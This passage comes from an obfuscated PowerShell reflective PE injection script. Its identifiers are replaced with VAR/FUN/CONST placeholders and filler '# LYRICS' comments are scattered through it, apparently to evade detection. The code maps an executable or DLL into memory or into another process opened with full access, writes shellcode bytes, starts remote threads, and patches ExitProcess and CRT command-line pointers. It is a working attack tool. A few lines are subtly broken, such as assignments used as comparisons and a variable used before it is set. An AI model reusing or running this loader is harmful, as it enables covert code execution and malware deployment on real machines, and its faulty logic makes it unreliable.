# LYRICS784
            $VAR0238 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
# LYRICS785
            $VAR0239 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
            $VAR0042.FUN033.Invoke($VAR0238, $VAR0233, [UInt64]$VAR0237) | Out-Null
            $VAR0042.FUN033.Invoke($VAR0239, $VAR0234, [UInt64]$VAR0237) | Out-Null
# LYRICS786
            $VAR0229 += , ($VAR0233, $VAR0238, $VAR0237)
# LYRICS787
            $VAR0229 += , ($VAR0234, $VAR0239, $VAR0237)
# LYRICS788
# LYRICS789
# LYRICS790
            [UInt32]$VAR0226 = 0
            $Success = $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
# LYRICS791
            if ($Success = $false) {
                throw "ERROR39"
            }
# LYRICS792
            $VAR0240 = $VAR0233
            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0240
# LYRICS793
            $VAR0240 = FUN005 $VAR0240 ($VAR0235.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0232, $VAR0240, $false)
# LYRICS794
            $VAR0240 = FUN005 $VAR0240 $VAR0163
# LYRICS795
            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0240
# LYRICS796
            $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
# LYRICS797
# LYRICS798
# LYRICS799
            [UInt32]$VAR0226 = 0
            $Success = $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
# LYRICS800
            if ($Success = $false) {
                throw "ERROR40"
            }
# LYRICS801
            $VAR0234Temp = $VAR0234
# LYRICS802
            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0234Temp
            $VAR0234Temp = FUN005 $VAR0234Temp ($VAR0235.Length)
# LYRICS803
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0231, $VAR0234Temp, $false)
# LYRICS804
            $VAR0234Temp = FUN005 $VAR0234Temp $VAR0163
# LYRICS805
            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0234Temp
# LYRICS806
            $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
# LYRICS807
# LYRICS808
# LYRICS809
# LYRICS810
# LYRICS811
# LYRICS812
# LYRICS813
            $VAR0241 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
                    , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll", "msvcr120.dll", "msvcrt.dll")
# LYRICS814
            foreach ($VAR0242 in $VAR0241) {
# LYRICS815
                [IntPtr]$VAR0243 = $VAR0042.FUN041.Invoke($VAR0242)
                if ($VAR0243 -ne [IntPtr]::Zero) {
# LYRICS816
                    [IntPtr]$VAR0244 = $VAR0042.FUN036.Invoke($VAR0243, "_wcmdln")
# LYRICS817
                    [IntPtr]$VAR0245 = $VAR0042.FUN036.Invoke($VAR0243, "_acmdln")
                    if ($VAR0244 -eq [IntPtr]::Zero -or $VAR0245 -eq [IntPtr]::Zero) {
# LYRICS818
                        "ERROR41"
                    }
# LYRICS819
                    $VAR0246 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0227)
# LYRICS820
                    $VAR0247 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($VAR0227)
# LYRICS821
# LYRICS822
# LYRICS823
                    $VAR0248 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0245, [Type][IntPtr])
# LYRICS824
                    $VAR0249 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0244, [Type][IntPtr])
                    $VAR0250 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
                    $VAR0251 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
# LYRICS825
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0248, $VAR0250, $false)
# LYRICS826
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0249, $VAR0251, $false)
                    $VAR0229 += , ($VAR0245, $VAR0250, $VAR0163)
# LYRICS827
                    $VAR0229 += , ($VAR0244, $VAR0251, $VAR0163)
# LYRICS828
                    $Success = $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                    if ($Success = $false) {
                        throw "ERROR42"
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0246, $VAR0245, $false)
# LYRICS829
                    $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
# LYRICS830
# LYRICS831
                    $Success = $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                    if ($Success = $false) {
# LYRICS832
                        throw "ERROR43"
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0247, $VAR0244, $false)
# LYRICS833
                    $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
                }
            }
# LYRICS834
# LYRICS835
# LYRICS836
# LYRICS837
# LYRICS838
            $VAR0229 = @()
# LYRICS839
            $VAR0252 = @() 
# LYRICS840
# LYRICS841
            [IntPtr]$VAR0253 = $VAR0042.FUN041.Invoke("mscoree.dll")
# LYRICS842
            if ($VAR0253 -eq [IntPtr]::Zero) {
# LYRICS843
                throw "ERROR44"
            }
            [IntPtr]$VAR0254 = $VAR0042.FUN036.Invoke($VAR0253, "CorExitProcess")
# LYRICS844
            if ($VAR0254 -eq [IntPtr]::Zero) {
                Throw "ERROR45"
# LYRICS845
            }
            $VAR0252 += $VAR0254
# LYRICS846
# LYRICS847
            [IntPtr]$VAR0255 = $VAR0042.FUN036.Invoke($VAR0168, "ExitProcess")
# LYRICS848
            if ($VAR0255 -eq [IntPtr]::Zero) {
                Throw "ERROR46"
# LYRICS849
            }
            $VAR0252 += $VAR0255
# LYRICS850
            [UInt32]$VAR0226 = 0
            foreach ($VAR0256 in $VAR0252) {
# LYRICS851
                $VAR0257 = $VAR0256
# LYRICS852
# LYRICS853
                [Byte[]]$VAR0235 = 187
# LYRICS854
                [Byte[]]$VAR0236 = 198,3,1,131,236,32,131,228,192,187
# LYRICS855
                if ($VAR0163 -eq 8) {
                    [Byte[]]$VAR0235 = 72,187
# LYRICS856
                    [Byte[]]$VAR0236 = 198,3,1,72,131,236,32,102,131,228,192,72,187
                }
                [Byte[]]$VAR0258 = 255,211
# LYRICS857
                $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length + $VAR0163 + $VAR0258.Length
# LYRICS858
                [IntPtr]$VAR0259 = $VAR0042.FUN036.Invoke($VAR0168, "ExitThread")
# LYRICS859
                if ($VAR0259 -eq [IntPtr]::Zero) {
                    Throw "ERROR47"
                }
# LYRICS860
                $Success = $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
# LYRICS861
                if ($Success -eq $false) {
                    Throw "ERROR48"
                }
# LYRICS862
# LYRICS863
                $VAR0260 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
# LYRICS864
                $VAR0042.FUN033.Invoke($VAR0260, $VAR0256, [UInt64]$VAR0237) | Out-Null
# LYRICS865
                $VAR0229 += , ($VAR0256, $VAR0260, $VAR0237)
# LYRICS866
# LYRICS867
# LYRICS868
                FUN010 -Bytes $VAR0235 -VAR0129 $VAR0257
                $VAR0257 = FUN005 $VAR0257 ($VAR0235.Length)
# LYRICS869
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0228, $VAR0257, $false)
                $VAR0257 = FUN005 $VAR0257 $VAR0163
# LYRICS870
                FUN010 -Bytes $VAR0236 -VAR0129 $VAR0257
                $VAR0257 = FUN005 $VAR0257 ($VAR0236.Length)
# LYRICS871
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0259, $VAR0257, $false)
# LYRICS872
                $VAR0257 = FUN005 $VAR0257 $VAR0163
# LYRICS873
                FUN010 -Bytes $VAR0258 -VAR0129 $VAR0257
# LYRICS874
                $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            }
# LYRICS875
# LYRICS876
            Write-Output $VAR0229
        }
# LYRICS877
# LYRICS878
# LYRICS879
        Function FUN026 {
# LYRICS880
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Array[]]
                $VAR0261,
# LYRICS881
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS882
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041
            )
# LYRICS883
            [UInt32]$VAR0226 = 0
            foreach ($VAR0262 in $VAR0261) {
# LYRICS884
                $Success = $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
# LYRICS885
                if ($Success -eq $false) {
                    Throw "ERROR50"
                }
# LYRICS886
                $VAR0042.FUN033.Invoke($VAR0262[0], $VAR0262[1], [UInt64]$VAR0262[2]) | Out-Null
# LYRICS887
# LYRICS888
                $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            }
        }
# LYRICS889
# LYRICS890
# LYRICS891
# LYRICS892
# LYRICS893
        Function FUN027 {
# LYRICS894
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263,
# LYRICS895
                [Parameter(Position = 1, Mandatory = $true)]
                [String]
                $VAR0187
            )
# LYRICS896
            $VAR010 = FUN001
# LYRICS897
            $VAR0041 = FUN002
# LYRICS898
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS899
# LYRICS900
            if ($VAR0126.CONST031.CONST122.CONST107.Size -eq 0) {
# LYRICS901
                return [IntPtr]::Zero
            }
            $VAR0264 = FUN005 ($VAR0263) ($VAR0126.CONST031.CONST122.CONST107.CONST074)
# LYRICS902
            $VAR0265 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0264, [Type]$VAR010.CONST155)
# LYRICS903
            for ($i = 0; $i -lt $VAR0265.CONST159; $i++) {
# LYRICS904
                $VAR0266 = FUN005 ($VAR0263) ($VAR0265.CONST161 + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
# LYRICS905
                $VAR0267 = FUN005 ($VAR0263) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0266, [Type][UInt32]))
# LYRICS906
                $VAR0268 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0267)
# LYRICS907
                if ($VAR0268 -ceq $VAR0187) {
# LYRICS908
# LYRICS909
                    $VAR0269 = FUN005 ($VAR0263) ($VAR0265.CONST162 + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
# LYRICS910
                    $VAR0270 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0269, [Type][UInt16])
# LYRICS911
                    $VAR0271 = FUN005 ($VAR0263) ($VAR0265.CONST160 + ($VAR0270 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
# LYRICS912
                    $VAR0272 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0271, [Type][UInt32])
                    return FUN005 ($VAR0263) ($VAR0272)
                }
            }
# LYRICS913
            return [IntPtr]::Zero
        }
# LYRICS914
# LYRICS915
        Function FUN028 {
# LYRICS916
            Param(
                [Parameter( Position = 0, Mandatory = $true )]
                [Byte[]]
                $VAR001,
# LYRICS917
                [Parameter(Position = 1, Mandatory = $false)]
                [String]
                $VAR004,
# LYRICS918
                [Parameter(Position = 2, Mandatory = $false)]
                [IntPtr]
                $VAR0161,
# LYRICS919
                [Parameter(Position = 3)]
                [Bool]
                $VAR007 = $false
            )
# LYRICS920
            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
# LYRICS921
# LYRICS922
            $VAR0041 = FUN002
            $VAR0042 = FUN003
# LYRICS923
            $VAR010 = FUN001
# LYRICS924
            $VAR0210 = $false
            if (($VAR0161 -ne $null) -and ($VAR0161 -ne [IntPtr]::Zero)) {
# LYRICS925
                $VAR0210 = $true
            }
# LYRICS926
# LYRICS927
            $VAR0126 = FUN016 -VAR001 $VAR001 -VAR010 $VAR010
# LYRICS928
            $VAR0196 = $VAR0126.VAR0196
            $VAR0273 = $true
# LYRICS929
            if (([Int] $VAR0126.CONST035 -band $VAR0041.CONST024) -ne $VAR0041.CONST024) {
# LYRICS930
                $VAR0273 = $false
            }
# LYRICS931
# LYRICS932
            $VAR0274 = $true
# LYRICS933
            if ($VAR0210 -eq $true) {
                $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
# LYRICS934
                $VAR0144 = $VAR0042.FUN036.Invoke($VAR0168, "IsWow64Process")
# LYRICS935
                if ($VAR0144 -eq [IntPtr]::Zero) {
                    Throw "ERROR52"
                }
# LYRICS936
                [Bool]$VAR0275 = $false
                $Success = $VAR0042.FUN055.Invoke($VAR0161, [Ref]$VAR0275)
# LYRICS937
                if ($Success -eq $false) {
                    Throw "ERROR53"
                }
# LYRICS938
                if (($VAR0275 -eq $true) -or (($VAR0275 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4))) {
# LYRICS939
                    $VAR0274 = $false
                }
# LYRICS940
# LYRICS941
                $VAR0276 = $true
                if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
# LYRICS942
                    $VAR0276 = $false
                }
                if ($VAR0276 -ne $VAR0274) {
                    throw "ERROR54"
                }
            }
            else {
                if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
# LYRICS943
                    $VAR0274 = $false
                }
            }
            if ($VAR0274 -ne $VAR0126.CONST032) {
# LYRICS944
                Throw "ERROR55"
            }
# LYRICS945
# LYRICS946
# LYRICS947
# LYRICS948
            [IntPtr]$VAR0277 = [IntPtr]::Zero
# LYRICS949
            $VAR0278 = ([Int] $VAR0126.CONST035 -band $VAR0041.CONST023) -eq $VAR0041.CONST023
            if ((-not $VAR007) -and (-not $VAR0278)) {
# LYRICS950
                Write-Warning "ERROR56" -WarningAction Continue
                [IntPtr]$VAR0277 = $VAR0196
            }
# LYRICS951
# LYRICS952
# LYRICS953
            $VAR0263 = [IntPtr]::Zero              
# LYRICS954
            $VAR0279 = [IntPtr]::Zero     
            if ($VAR0210 -eq $true) {
# LYRICS955
                $VAR0263 = $VAR0042.FUN031.Invoke([IntPtr]::Zero, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS956
# LYRICS957
                $VAR0279 = $VAR0042.FUN032.Invoke($VAR0161, $VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS958
                if ($VAR0279 -eq [IntPtr]::Zero) {
                    Throw "ERROR57"
                }
            }
            else {
                if ($VAR0273 -eq $true) {
                    $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS959
                }
                else {
                    $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS960
                }
                $VAR0279 = $VAR0263
            }
# LYRICS961
            [IntPtr]$VAR0128 = FUN005 ($VAR0263) ([Int64]$VAR0126.CONST033)
            if ($VAR0263 -eq [IntPtr]::Zero) {
                Throw "ERROR58."
            }
# LYRICS962
            [System.Runtime.InteropServices.Marshal]::Copy($VAR001, 0, $VAR0263, $VAR0126.CONST034) | Out-Null
# LYRICS963
# LYRICS964
# LYRICS965
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS966
            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST038 -Value $VAR0128
            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST039 -Value $VAR0279
# LYRICS967
# LYRICS968
            FUN020 -VAR001 $VAR001 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010
# LYRICS969
# LYRICS970
# LYRICS971
            FUN021 -VAR0126 $VAR0126 -VAR0196 $VAR0196 -VAR0041 $VAR0041 -VAR010 $VAR010
# LYRICS972
# LYRICS973
# LYRICS974
            if ($VAR0210 -eq $true) {
                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041 -VAR0161 $VAR0161
            }
            else {
                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041
            }
# LYRICS975
# LYRICS976
# LYRICS977
            if ($VAR0210 -eq $false) {
                if ($VAR0273 -eq $true) {
# LYRICS978
                    FUN024 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR010 $VAR010
                }
# LYRICS979
            }
# LYRICS980
# LYRICS981
# LYRICS982
# LYRICS983
            if ($VAR0210 -eq $true) {
                [UInt32]$VAR0167 = 0
# LYRICS984
                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0279, $VAR0263, [UIntPtr]($VAR0126.CONST033), [Ref]$VAR0167)
# LYRICS985
                if ($Success -eq $false) {
                    Throw "ERROR59"
                }
            }
# LYRICS986
# LYRICS987
# LYRICS988
            if ($VAR0126.CONST037 -ieq "Library") {
# LYRICS989
                if ($VAR0210 -eq $false) {
# LYRICS990
                    $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
# LYRICS991
                    $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
# LYRICS992
                    $VAR0282 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0280, $VAR0281)
# LYRICS993
                    $VAR0282.Invoke($VAR0126.VAR0263, 1, [IntPtr]::Zero) | Out-Null
                }
                else {
                    $VAR0280 = FUN005 ($VAR0279) ($VAR0126.CONST031.CONST122.CONST060)
# LYRICS994
                    if ($VAR0126.CONST032 -eq $true) {
# LYRICS995
                        $VAR0283 = 83,72,137,227,102,131,228,0,72,185
# LYRICS996
                        $VAR0284 = 186,1,0,0,0,65,184,0,0,0,0,72,184
# LYRICS997
                        $VAR0285 = 255,208,72,137,220,91,195
                    }
                    else {
# LYRICS998
                        $VAR0283 = 83,137,227,131,228,240,185
# LYRICS999
                        $VAR0284 = 186,1,0,0,0,184,0,0,0,0,80,82,81,184
                        $VAR0285 = 255,208,137,220,91,195
                    }
                    $VAR0171 = $VAR0283.Length + $VAR0284.Length + $VAR0285.Length + ($VAR0163 * 2)
# LYRICS1000
                    $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
                    $VAR0173 = $VAR0172
# LYRICS1001
                    FUN010 -Bytes $VAR0283 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0283.Length)
# LYRICS1002
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0279, $VAR0172, $false)
                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                    FUN010 -Bytes $VAR0284 -VAR0129 $VAR0172
# LYRICS1003
                    $VAR0172 = FUN005 $VAR0172 ($VAR0284.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0280, $VAR0172, $false)
# LYRICS1004
                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
# LYRICS1005
                    FUN010 -Bytes $VAR0285 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0285.Length)
# LYRICS1006
                    $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS1007
                    if ($VAR0178 -eq [IntPtr]::Zero) {
# LYRICS1008
                        Throw "ERROR60"
                    }
# LYRICS1009
                    $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
# LYRICS1010
                    if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                        Throw "ERROR61"
                    }
# LYRICS1011
                    $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
# LYRICS1012
                    $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
# LYRICS1013
                    if ($VAR0144 -ne 0) {
                        Throw "ERROR62"
                    }
# LYRICS1014
                    $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
                }
            }
            elseif ($VAR0126.CONST037 -ieq "Executable") {
# LYRICS1015
                [IntPtr]$VAR0228 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
# LYRICS1016
                [System.Runtime.InteropServices.Marshal]::WriteByte($VAR0228, 0, 0x00)
# LYRICS1017
                $VAR0286 = FUN025 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR0227 $VAR004 -VAR0228 $VAR0228
# LYRICS1018
# LYRICS1019
# LYRICS1020
                [IntPtr]$VAR0287 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
# LYRICS1021
                $VAR0042.FUN056.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $VAR0287, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
# LYRICS1022
                while ($true) {
                    [Byte]$VAR0288 = [System.Runtime.InteropServices.Marshal]::ReadByte($VAR0228, 0)
# LYRICS1023
                    if ($VAR0288 -eq 1) {
# LYRICS1024
                        FUN026 -VAR0261 $VAR0286 -VAR0042 $VAR0042 -VAR0041 $VAR0041
                        break
                    }
                    else {
# LYRICS1025
                        Start-Sleep -Seconds 1
                    }
                }
            }
# LYRICS1026
            return @($VAR0126.VAR0263, $VAR0279)
        }
# LYRICS1027
# LYRICS1028
        Function FUN029 {
# LYRICS1029
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263
            )
# LYRICS1030
# LYRICS1031
            $VAR0041 = FUN002
            $VAR0042 = FUN003
# LYRICS1032
            $VAR010 = FUN001
# LYRICS1033
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS1034
# LYRICS1035
            if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
# LYRICS1036
                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)
# LYRICS1037
                while ($true) {
# LYRICS1038
                    $VAR0212 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)
# LYRICS1039
# LYRICS1040
                    if ($VAR0212.CONST067 -eq 0 `
                            -and $VAR0212.CONST154 -eq 0 `
                            -and $VAR0212.CONST153 -eq 0 `
                            -and $VAR0212.Name -eq 0 `
                            -and $VAR0212.CONST071 -eq 0) {
                        break
                    }
# LYRICS1041
                    $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name)))
# LYRICS1042
                    $VAR0213 = $VAR0042.FUN041.Invoke($VAR0164)
# LYRICS1043
# LYRICS1044
# LYRICS1045
                    $Success = $VAR0042.FUN042.Invoke($VAR0213)
# LYRICS1046
# LYRICS1047
                    $VAR0211 = FUN005 ($VAR0211) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST152))
                }
            }
# LYRICS1048
# LYRICS1049
            $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
# LYRICS1050
            $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
# LYRICS1051
            $VAR0282 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0280, $VAR0281)
# LYRICS1052
            $VAR0282.Invoke($VAR0126.VAR0263, 0, [IntPtr]::Zero) | Out-Null
# LYRICS1053
# LYRICS1054
            $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
# LYRICS1055
        }
# LYRICS1056
# LYRICS1057
        Function FUN030 {
            $VAR0042 = FUN003
            $VAR010 = FUN001
# LYRICS1058
            $VAR0041 = FUN002
# LYRICS1059
            $VAR0161 = [IntPtr]::Zero
# LYRICS1060
# LYRICS1061
            if (($VAR005 -ne $null) -and ($VAR005 -ne 0) -and ($VAR006 -ne $null) -and ($VAR006 -ne "")) {
# LYRICS1062
                Throw "ERROR64"
            }
            elseif ($VAR006 -ne $null -and $VAR006 -ne "") {
# LYRICS1063
                $VAR0289 = @(Get-Process -Name $VAR006 -ErrorAction SilentlyContinue)
# LYRICS1064
                if ($VAR0289.Count -eq 0) {
                    Throw "ERROR65 $VAR006"
                }
                elseif ($VAR0289.Count -gt 1) {
# LYRICS1065
                    $VAR0290 = Get-Process | Where-Object { $_.Name -eq $VAR006 } | Select-Object ProcessName, Id, SessionId
# LYRICS1066
                    Write-Output $VAR0290
                    Throw "ERROR66 $VAR006"
                }
                else {
                    $VAR005 = $VAR0289[0].ID
                }
            }
# LYRICS1067
# LYRICS1068
# LYRICS1069
# LYRICS1070
# LYRICS1071
# LYRICS1072
# LYRICS1073
# LYRICS1074
# LYRICS1075
            if (($VAR005 -ne $null) -and ($VAR005 -ne 0)) {
# LYRICS1076
                $VAR0161 = $VAR0042.FUN043.Invoke(0x001F0FFF, $false, $VAR005)
# LYRICS1077
                if ($VAR0161 -eq [IntPtr]::Zero) {
                    Throw "ERROR67: $VAR005"
                }
# LYRICS1078
            }
# LYRICS1079
# LYRICS1080
# LYRICS1081
            $VAR0263 = [IntPtr]::Zero
            if ($VAR0161 -eq [IntPtr]::Zero) {
# LYRICS1082
                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR007 $VAR007
            }
            else {
# LYRICS1083
                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR0161 $VAR0161 -VAR007 $VAR007
            }
            if ($VAR0291 -eq [IntPtr]::Zero) {
# LYRICS1084
                Throw "ERROR68"
            }
# LYRICS1085
            $VAR0263 = $VAR0291[0]
# LYRICS1086
            $VAR0292 = $VAR0291[1] 
# LYRICS1087
# LYRICS1088
# LYRICS1089
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS1090
            if (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -eq [IntPtr]::Zero)) {
# LYRICS1091
# LYRICS1092
# LYRICS1093
                switch ($VAR003) {
                    'WideStr' {
# LYRICS1094
# LYRICS1095
                        [IntPtr]$VAR0293 = FUN027 -VAR0263 $VAR0263 -FunctionName "WideStrFunc"
# LYRICS1096
                        if ($VAR0293 -eq [IntPtr]::Zero) {
                            Throw "ERROR67"
                        }
                        $VAR0294 = FUN011 @() ([IntPtr])
# LYRICS1097
                        $VAR0295 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0293, $VAR0294)
# LYRICS1098
                        [IntPtr]$VAR0296 = $VAR0295.Invoke()
# LYRICS1099
                        $VAR0297 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($VAR0296)
                        Write-Output $VAR0297
                    }
# LYRICS1100
                    'Str' {
# LYRICS1101
                        [IntPtr]$VAR0298 = FUN027 -VAR0263 $VAR0263 -FunctionName "StringFunc"
# LYRICS1102
                        if ($VAR0298 -eq [IntPtr]::Zero) {
                            Throw "ERROR68"
                        }
                        $VAR0299 = FUN011 @() ([IntPtr])
# LYRICS1103
                        $VAR0300 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0298, $VAR0299)
# LYRICS1104
                        [IntPtr]$VAR0296 = $VAR0300.Invoke()
# LYRICS1105
                        $VAR0297 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0296)
# LYRICS1106
                        Write-Output $VAR0297
                    }
# LYRICS1107
                    'NoOutput' {
# LYRICS1108
                        [IntPtr]$VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
                        if ($VAR0301 -eq [IntPtr]::Zero) {
# LYRICS1109
                            Throw "ERROR69"
                        }
                        $VAR0302 = FUN011 @() ([Void])
# LYRICS1110
                        $VAR0303 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0301, $VAR0302)
# LYRICS1111
                        $VAR0303.Invoke() | Out-Null
                    }
                    'DefaultSettings' {
# LYRICS1112
                        Write-Verbose "ERROR70"
                    }
                }
# LYRICS1113
# LYRICS1114
# LYRICS1115
            }
# LYRICS1116
